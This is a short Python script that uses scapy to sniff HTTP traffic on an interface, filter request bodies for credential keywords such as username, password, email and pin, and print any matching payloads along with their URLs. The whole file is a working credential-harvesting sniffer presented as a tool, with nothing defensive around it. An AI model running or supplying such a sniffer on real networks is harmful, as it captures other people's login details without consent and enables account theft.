import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        if packet.haslayer(scapy.Raw):
            Load=packet[scapy.Raw].load
            keywords=['username','user','uname','password','pass','email','login','pin']
            t=0
            for item in keywords:
                if item in Load:
                    t=1
            if t==1:
                print(Load)
                print(url)
                t=0

sniff('eth0')